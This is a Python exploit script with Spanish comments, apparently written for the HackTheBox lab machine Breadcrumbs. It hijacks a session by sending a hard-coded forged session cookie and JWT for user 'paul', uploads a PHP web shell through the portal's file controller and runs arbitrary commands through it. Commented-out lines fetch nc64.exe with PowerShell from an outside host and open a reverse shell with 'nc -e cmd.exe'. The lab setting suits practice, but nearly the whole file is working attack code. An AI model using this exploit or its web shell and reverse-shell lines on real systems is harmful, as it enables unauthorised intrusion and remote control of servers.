#!/usr/bin/python3 

# Programa creado para hacer un cookie-hijacking y a su vez subir archivos como ese usuario (Arbitrary File Upload).
## Subiremos un archivo .php para ejecutar comandos en el sistema (RCE).
### By. lanzf

import requests, re, hashlib, argparse, base64, signal
from pwn import *

# CTRL+C
def def_handler(sig, frame):
    print("\ns4li3ND0...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

class Color:
    DARKCYAN = '\033[36m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

banner = base64.b64decode("4pWT4pSA4pSA4pWW4pWT4pSA4pSA4pWW4pWT4pSA4pSAIOKVk+KUgOKUgOKVluKVpeKUgOKUgOKVluKVk+KUgOKUgCDilZPilIDilIDilZbilaUgIOKVpeKVk+KVluKVk+KVluKVk+KUgOKUgOKVluKVk+KUgOKUgOKVlgrilZHilIDilIDilZzilZHilIDilIDilZzilZEgICDilZEgIOKVq+KVkSAg4pWR4pWRICAg4pWR4pSA4pSA4pWc4pWRICDilZHilZHilZHilavilZHilZHilIDilIDilZzilZnilIDilIDilZYK4pWr4pSA4pSA4pWW4pWr4pSA4pSA4pWW4pWr4pSA4pSAIOKVkeKUgOKUgOKVoiAgIOKVq+KVqyAgIOKVq+KUgOKUgOKVluKVqyAg4pWR4pWR4pWR4pWr4pWR4pWr4pSA4pSA4pWW4pWlICDilasK4pWo4pSA4pSA4pWc4pWoICDilajilZnilIDilIDilIDilaggIOKVqOKUgOKUgOKUgOKVnOKVmeKUgOKUgOKUgOKVqCAg4pWo4pWZ4pSA4pSA4pWc4pWo4pWZ4pWc4pWo4pWo4pSA4pSA4pWc4pWZ4pSA4pSA4pWc4oCiIEJ5IGxhbnpmCgpSQ0Ugd2l0aCBhcmJpdHJhcnkgdXBsb2FkIFBIUCBmaWxlLgo=").decode()

print("\n" + Color.DARKCYAN + banner + Color.END)

url = "http://10.10.10.228/portal"

# Si vas a generar una reverse shell o hacer directory listing, intenta escapar el caracter \, ejemplo: dir C:\\Users\\lanz, pueda que te genere problemas como pueda que no :P

def arguments():
    parse = argparse.ArgumentParser(description=Color.DARKCYAN + 'Cookie-Hijacking - RCE mediante archivo PHP - HackTheBox Breadcrumbs' + Color.END)
    parse.add_argument('-u', dest='username', type=str, default="lanz", help='Username to create account · default: lanz')
    parse.add_argument('-p', dest='password', type=str, default="lanz321", help='Password to create account · default: lanz321')
    parse.add_argument('-f', dest='file_name', type=str, default="hola", help='Filename to upload · default: hola.php')
    parse.add_argument('-c', dest='command', type=str, default="whoami", help='Command to execute (remember escape "\\" to avoid problems) i.e: -c "dir C:\\\\Users" · default: whoami')
    return parse.parse_args()

# Creamos cuenta en el portal web
def register_acc(username, password):
    session = requests.Session()
    p1 = log.progress("Creando usuario" + Color.DARKCYAN + " " + username + Color.END)
    time.sleep(1)

    data_post = {
        "username" : username,
        "password" : password,
        "passwordConf" : password,
        "method" : "1"
    }

    # Validamos conexión con la máquina
    try:
        r = session.post(url + "/signup.php", data=data_post, timeout=3)

        if "Username already exists" in r.text:
            p1.success("Ya tas creado de antes, sigamos...")
        else:
            p1.success("Creado")
        time.sleep(1)
    except requests.exceptions.Timeout:
        p1.failure(Color.RED + "Timeout, revisa la conexión hacia la máquina" + Color.END)
        exit(1)

# Entramos al portal
def login_acc(username, password):
    session = requests.Session()
    p2 = log.progress("Ingresando al portal web")
    time.sleep(1)

    data_post = {
        "username" : username,
        "password" : password,
        "method" : "0"
    }
    r = session.post(url + "/login.php", data=data_post)

    p2.success("Tamos dentro")
    time.sleep(1)

# Subimos el archivo al portal con la sesión del usuario "paul"
def upload_file_as_paul(file_name, command):
    session = requests.Session()
    file_name = file_name + ".php"

    p3 = log.progress("Subiendo " + Color.DARKCYAN + file_name + Color.END + " como el usuario " + Color.DARKCYAN + "paul" + Color.END)
    time.sleep(1)

    cookie = {
        "PHPSESSID" : "paul47200b180ccd6835d25d034eeb6e6390",
        "token" : "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU"
    }
    data_post = {
        "task" : file_name
    }
    data_file = [
            ('file',
                (file_name, "<?php $coma=shell_exec($_GET['xmd']); echo $coma; ?>", 'application/zip'))]

    # Subimos archivo
    r = session.post(url + "/includes/fileController.php", data=data_post, files=data_file, cookies=cookie)
    p3.success("Archivo subido")
    time.sleep(1)

    # Ejecutamos el comando usando el archivo subido (si es una reverse shell, ponte en escucha)
    p4 = log.progress("Ejecutando comando " + Color.YELLOW + command + Color.END + " en el sistema")
    time.sleep(1)

    #payload = file_name + '?xmd=powershell -c "IWR -uri http://10.10.14.194:8000/nc64.exe -OutFile C:\\Users\\www-data\\Desktop\\xampp\\tmp\\nc.exe"'
    #payload = file_name + "?xmd=C:\\Users\\www-data\\Desktop\\xampp\\tmp\\nc.exe 10.10.14.194 4433 -e cmd.exe"

    payload = file_name + '?xmd=' + command

    # Ejecución del comando
    try:
        time_now = time.time()
        r = session.get(url + "/uploads/" + payload, timeout=3)
        p4.success(Color.YELLOW + "\n\n" + r.text + Color.END)

    except requests.exceptions.Timeout:
        time_after = time.time()

        # Por si quieres obtener una reverse shell, asi evitamos que la web se quede con la conexión abierta, apenas pasen 3 segundos la cierra
        if time_after - time_now > 2:
            p4.status("Generando Reverse Shell, espera un momento")
            time.sleep(5)
            p4.success(Color.YELLOW + "Reverse Shell generada" + Color.END)

    # Borramos archivo subido
    payload = file_name + '?xmd=del ' + file_name
    r = session.get(url + "/uploads/" + payload)

    print("[+] a R0MpeR t0do! \n")

if __name__ == '__main__':
    args = arguments()
    register_acc(args.username, args.password)
    login_acc(args.username, args.password)
    upload_file_as_paul(args.file_name, args.command)
